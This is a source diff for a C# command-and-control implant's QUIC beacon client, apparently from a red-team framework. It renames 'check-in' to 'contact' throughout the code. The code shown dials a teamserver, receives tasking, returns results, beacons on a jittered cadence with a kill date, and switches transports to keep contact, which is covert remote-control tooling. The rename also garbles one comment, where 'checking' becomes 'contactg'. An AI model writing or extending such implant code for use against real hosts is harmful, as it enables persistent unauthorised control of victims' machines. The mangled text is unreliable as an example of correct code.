@@ -12,7 +12,7 @@ namespace Rod.Implant.Internal;
 // The reference implant's QUIC stream client (architecture.md Sec 8): the
 // same live session the gRPC stream and the WebSocket beacon run, over a
 // QUIC connection -- the duplex shape for egress that passes UDP/443 but
-// blocks TCP. The wire is the stream check-in contract
+// blocks TCP. The wire is the stream contact contract
 // (extending/implants.md): one bidirectional stream per connection, one
 // self-delimited message per direction turn -- a varint byte length, then
 // the envelope's delimited frame sequence. TLS is QUIC's own (the front
@@ -26,9 +26,9 @@ namespace Rod.Implant.Internal;
 /// Builds the QUIC stream client off the shared setup; the factory the
 /// generated transport selection names for quic:// beacon entries.
 /// </summary>
-internal static class QuicCheckIn
+internal static class QuicContact
 {
-    public static ICheckInClient Create(CheckInSetup setup) => new QuicBeacon(
+    public static IContactClient Create(ContactSetup setup) => new QuicBeacon(
         setup.Egress,
         setup.Enrollment.ImplantId,
         setup.Enrollment.CAs,
@@ -41,7 +41,7 @@ internal static class QuicCheckIn
         setup.Nonces,
         setup.Cadence,
         setup.Held,
-        // The check-in mode rides in like every other client's: stream holds
+        // The contact mode rides in like every other client's: stream holds
         // the session, poll ends each cycle on the idle window below and
         // sleeps the cadence between connections.
         setup.Config.Mode,
@@ -53,7 +53,7 @@ internal static class QuicCheckIn
 }
 
 /// <summary>
-/// Runs the implant's check-in lifecycle over a QUIC stream: dial the
+/// Runs the implant's contact lifecycle over a QUIC stream: dial the
 /// connection, open the stream, handshake (the first message), then run
 /// the baked mode -- stream holds the session open (read tasking and
 /// channel input, write results and channel output) until the connection
@@ -62,7 +62,7 @@ internal static class QuicCheckIn
 /// connection is a reconnect, not a termination: the session survives it
 /// server-side, so the next cycle re-handshakes and continues.
 /// </summary>
-internal sealed class QuicBeacon : ICheckInClient
+internal sealed class QuicBeacon : IContactClient
 {
     /// <summary>
     /// The ALPN the listener matches. Textual lockstep with the teamserver's
@@ -90,7 +90,7 @@ internal sealed class QuicBeacon : ICheckInClient
     // dedup, staged/channel/inline shapes) over this client's per-run state.
     private readonly BeaconTasking _tasking;
 
-    // The check-in mode (stream holds, poll cycles -- the same pair every
+    // The contact mode (stream holds, poll cycles -- the same pair every
     // client bakes).
     private readonly string _mode;
 
@@ -159,11 +159,11 @@ internal sealed class QuicBeacon : ICheckInClient
     /// handshake refusal. A dropped connection walks the egress entry and
     /// reconnects on the jittered cadence with the same exponential backoff
     /// the other clients apply. Returns
-    /// <see cref="CheckInExit.SwitchTransport"/> when the walk's current
+    /// <see cref="ContactExit.SwitchTransport"/> when the walk's current
     /// entry is not a quic:// URL, so the coordinator hands the run to the
     /// client that carries it.
     /// </summary>
-    public async Task<CheckInExit> RunAsync(CancellationToken cancellationToken)
+    public async Task<ContactExit> RunAsync(CancellationToken cancellationToken)
     {
         try
         {
@@ -177,7 +177,7 @@ internal sealed class QuicBeacon : ICheckInClient
         }
     }
 
-    private async Task<CheckInExit> RunCyclesAsync(CancellationToken cancellationToken)
+    private async Task<ContactExit> RunCyclesAsync(CancellationToken cancellationToken)
     {
         var consecutiveFailures = 0;
         while (!cancellationToken.IsCancellationRequested)
@@ -185,10 +185,10 @@ internal sealed class QuicBeacon : ICheckInClient
             if (_killDate is { } killDate && DateTimeOffset.Now > killDate)
             {
                 _log.WriteLine($"beacon kill date {killDate:O} reached; terminating");
-                return CheckInExit.Terminate;
+                return ContactExit.Terminate;
             }
             if (!BeaconUrl.IsQuic(_egress.CurrentBeaconUrl))
-                return CheckInExit.SwitchTransport;
+                return ContactExit.SwitchTransport;
 
             var cycle = BeaconCycleResult.Dropped;
             try
@@ -211,7 +211,7 @@ internal sealed class QuicBeacon : ICheckInClient
             // Every non-OK handshake status is permanent for this artifact:
             // retrying would not change the answer.
             if (cycle == BeaconCycleResult.Terminal)
-                return CheckInExit.Terminate;
+                return ContactExit.Terminate;
 
             if (cycle == BeaconCycleResult.Handshaken)
             {
@@ -230,14 +230,14 @@ internal sealed class QuicBeacon : ICheckInClient
             try
             {
                 var (sleep, jitter) = _cadence?.Current ?? (_sleep, _jitter);
-                await CheckInCadence.SleepWithJitterAsync(sleep, jitter, consecutiveFailures, cancellationToken);
+                await ContactCadence.SleepWithJitterAsync(sleep, jitter, consecutiveFailures, cancellationToken);
             }
             catch (OperationCanceledException)
             {
-                return CheckInExit.Terminate;
+                return ContactExit.Terminate;
             }
         }
-        return CheckInExit.Terminate;
+        return ContactExit.Terminate;
     }
 
     // One connection: dial (or take the enroll exchange's handoff wire, the
@@ -573,14 +573,14 @@ internal sealed class QuicBeacon : ICheckInClient
 }
 
 // The QUIC dial and the self-delimited message framing over one
-// bidirectional stream: the stream check-in contract's wire shape
+// bidirectional stream: the stream contact contract's wire shape
 // (extending/implants.md), the transport half this client adapts. Plain
 // .NET stream types cross its boundary, so the QUIC surface (and its
 // platform gate) stays inside.
 internal sealed class QuicWire : IAsyncDisposable
 {
     // The message budget: the envelope's wire-body cap, the same ceiling the
-    // poll bridges enforce on a check-in message.
+    // poll bridges enforce on a contact message.
     private const int MaxMessageBytes = 16 * 1024 * 1024;
 
     // The pinned-CA validation and keep-alive interval ride every dial.
@@ -588,7 +588,7 @@ internal sealed class QuicWire : IAsyncDisposable
     private readonly QuicStream _stream;
 
     // Whether the host OS carries a QUIC stack (msquic on Linux): the union
-    // guard the platform analyzer follows; a dial before checking it throws
+    // guard the platform analyzer follows; a dial before contactg it throws
     // the named cause instead of a platform exception mid-lifecycle.
     [System.Runtime.Versioning.SupportedOSPlatformGuard("windows")]
     [System.Runtime.Versioning.SupportedOSPlatformGuard("linux")]
@@ -702,10 +702,10 @@ internal sealed class QuicWire : IAsyncDisposable
                 break;
             shift += 7;
             if (shift > 28)
-                throw new InvalidOperationException("check-in length prefix is a malformed varint");
+                throw new InvalidOperationException("contact length prefix is a malformed varint");
         }
         if (length > MaxMessageBytes)
-            throw new InvalidOperationException("check-in message exceeds the body budget");
+            throw new InvalidOperationException("contact message exceeds the body budget");
 
         var body = new byte[length];
         var offset = 0;
